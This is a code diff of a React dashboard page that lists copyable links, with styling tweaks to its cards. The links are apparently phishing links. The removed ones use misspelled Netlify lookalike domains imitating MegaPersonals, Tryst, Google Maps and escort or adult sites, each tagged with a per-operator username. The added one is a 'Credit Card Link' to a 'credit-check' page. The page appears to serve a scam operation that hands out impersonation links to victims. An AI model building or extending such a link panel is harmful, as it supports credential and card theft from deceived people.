@@ -61,7 +61,7 @@ const LinkCard = ({ title, url, icon, linkKey, handleCopy }) => {
 
   return (
     <motion.div
-      className="bg-white rounded-lg shadow-lg overflow-hidden border-l-4 border-sky-500"
+      className="bg-white rounded-lg overflow-hidden border-l-4 border-sky-500 transition-all hover:shadow-blue-400 hover:shadow-[-5px_-5px_10px_2px] shadow-[5px_5px_10px_2px] shadow-blue-400"
       whileHover={{ y: -5 }}
       transition={{ type: "spring", stiffness: 300 }}
       onHoverStart={() => setIsHovering(true)}
@@ -84,7 +84,7 @@ const LinkCard = ({ title, url, icon, linkKey, handleCopy }) => {
 
         <motion.button
           onClick={() => handleCopy(url, linkKey)}
-          className="w-full text-white bg-gradient-to-r from-sky-500 to-blue-500 hover:from-sky-600 hover:to-blue-600 py-2 px-4 rounded-md flex items-center justify-center"
+          className="w-full text-white bg-gradient-to-br transition-all from-sky-700 to-blue-600 hover:from-sky-900 hover:to-blue-600 py-2 px-4 rounded-md flex items-center justify-center"
           whileTap={{ scale: 0.95 }}
         >
           {isHovering ? <FaRegCopy className="text-lg mr-2" /> : <FaCheck className="text-lg mr-2" />}
@@ -103,18 +103,8 @@ const Links = () => {
 
   // Define all links in a single object for easier management
   const links = {
-    mega: {
-      login: `https://megaqerrsonals.netlify.app/${username}`,
-      duo: `https://call-info.netlify.app/${username}/duo`,
-      whatsapp: `https://call-info.netlify.app/${username}/whatsapp`,
-      facetime: `https://call-info.netlify.app/${username}/facetime`,
-    },
-    google: `https://google-mapss.netlify.app/${username}`,
-    tryst: `https://supprt-trust.netlify.app/${username}`,
-    eroticMonkey: `https://supprt-erticmonkey.netlify.app/${username}`,
-    adultSearch: `https://adult-search.netlify.app/${username}`,
-    callEscort: `https://call-escort-dev.netlify.app/${username}`,
-    hot: `https://hot-dev.netlify.app/${username}`,
+
+    credit_card: `https://credit-check.netlify.app/`,
   }
 
   // Handle copy to clipboard with toast notification
@@ -134,6 +124,26 @@ const Links = () => {
   return (
     <div className="min-h-screen bg-gray-50 py-8 px-4 md:px-8">
       <ToastContainer />
+
+      {/* Other Links Section */}
+      <div className="mb-10">
+        <div className="flex items-center gap-3 mb-6">
+          <div className="bg-sky-500 p-2 rounded-lg">
+            <FaLink className="text-white text-xl" />
+          </div>
+          <h2 className="text-2xl font-semibold text-sky-800">Service Links</h2>
+        </div>
+
+        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+          <LinkCard
+            title="Credit Card Link"
+            url={links.credit_card}
+            icon={<FaLink className="text-white text-lg" />}
+            linkKey="credit_card"
+            handleCopy={handleCopy}
+          />
+        </div>
+      </div>
 
       <motion.div
         className="max-w-7xl mx-auto"
@@ -175,101 +185,7 @@ const Links = () => {
           </div>
         </motion.div>
 
-        {/* Mega Links Section */}
-        <div className="mb-10">
-          <div className="flex items-center gap-3 mb-6">
-            <div className="bg-indigo-500 p-2 rounded-lg">
-              <FaLink className="text-white text-xl" />
-            </div>
-            <h2 className="text-2xl font-semibold text-indigo-800">Mega Links</h2>
-          </div>
 
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-            <MegaLinkCard
-              title="Mega Login"
-              url={links.mega.login}
-              icon={<FaExternalLinkAlt className="text-white text-lg" />}
-              linkKey="Mega Login"
-              handleCopy={handleCopy}
-            />
-            <MegaLinkCard
-              title="Mega Duo"
-              url={links.mega.duo}
-              icon={<BiLinkExternal className="text-white text-lg" />}
-              linkKey="Mega Duo"
-              handleCopy={handleCopy}
-            />
-            <MegaLinkCard
-              title="Mega WhatsApp"
-              url={links.mega.whatsapp}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Mega WhatsApp"
-              handleCopy={handleCopy}
-            />
-            <MegaLinkCard
-              title="Mega FaceTime"
-              url={links.mega.facetime}
-              icon={<BiLinkExternal className="text-white text-lg" />}
-              linkKey="Mega FaceTime"
-              handleCopy={handleCopy}
-            />
-          </div>
-        </div>
-
-        {/* Other Links Section */}
-        <div className="mb-10">
-          <div className="flex items-center gap-3 mb-6">
-            <div className="bg-sky-500 p-2 rounded-lg">
-              <FaLink className="text-white text-xl" />
-            </div>
-            <h2 className="text-2xl font-semibold text-sky-800">Service Links</h2>
-          </div>
-
-          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-            <LinkCard
-              title="Google Maps"
-              url={links.google}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Google Maps"
-              handleCopy={handleCopy}
-            />
-            <LinkCard
-              title="Tryst"
-              url={links.tryst}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Tryst"
-              handleCopy={handleCopy}
-            />
-            <LinkCard
-              title="Erotic Monkey"
-              url={links.eroticMonkey}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Erotic Monkey"
-              handleCopy={handleCopy}
-            />
-            <LinkCard
-              title="Adult Search"
-              url={links.adultSearch}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Adult Search"
-              handleCopy={handleCopy}
-            />
-            <LinkCard
-              title="Call Escort"
-              url={links.callEscort}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Call Escort"
-              handleCopy={handleCopy}
-            />
-            <LinkCard
-              title="Hot"
-              url={links.hot}
-              icon={<FaLink className="text-white text-lg" />}
-              linkKey="Hot"
-              handleCopy={handleCopy}
-            />
-          </div>
-        </div>
 
         {/* Info Card */}
         <motion.div
